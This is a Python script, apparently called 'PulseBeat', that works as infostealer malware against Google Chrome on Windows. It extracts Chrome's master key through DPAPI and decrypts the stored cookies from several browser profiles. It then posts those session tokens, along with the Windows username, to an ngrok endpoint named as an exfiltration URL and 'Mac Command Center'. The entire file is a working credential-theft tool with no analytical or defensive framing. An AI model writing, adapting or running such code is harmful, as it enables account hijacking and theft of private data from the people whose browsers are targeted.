import os
import json
import base64
import sqlite3
import requests
import shutil
from Cryptodome.Cipher import AES
import win32crypt

# --- CONFIG: UPDATED FOR CLOUD EXFILTRATION ---
# Use your active Ngrok URL here
EXFIL_URL = "https://mickie-spookiest-wilford.ngrok-free.dev/api/capture"

def get_master_key():
    path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def get_decrypted_cookies():
    try:
        key = get_master_key()
    except:
        return []
        
    user_data = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
    # Scanning all common profiles
    profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
    decrypted_data = []

    for profile in profiles:
        db_path = os.path.join(user_data, profile, 'Network', 'Cookies')
        if not os.path.exists(db_path): continue
        
        temp_db = os.path.join(os.environ["TEMP"], f"decryption_{profile}.db")
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            
            for host, name, encrypted_val in cursor.fetchall():
                try:
                    iv, payload = encrypted_val[3:15], encrypted_val[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    decrypted_val = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                    
                    if decrypted_val:
                        decrypted_data.append({"domain": host, "name": name, "value": decrypted_val})
                except: continue
                
            conn.close()
            os.remove(temp_db)
        except: continue
        
    return decrypted_data

if __name__ == "__main__":
    print("[*] PulseBeat: Unlocking local vault...")
    results = get_decrypted_cookies()
    if results:
        print(f"[SUCCESS] Decrypted {len(results)} WORKING tokens.")
        try:
            # Sending to your Mac via Ngrok Tunnel
            requests.post(EXFIL_URL, json={"user": os.getlogin(), "tokens": results}, timeout=20)
            print("[!] Data transmitted to Mac Command Center.")
        except Exception as e:
            print(f"[-] Transmission failed: {e}")
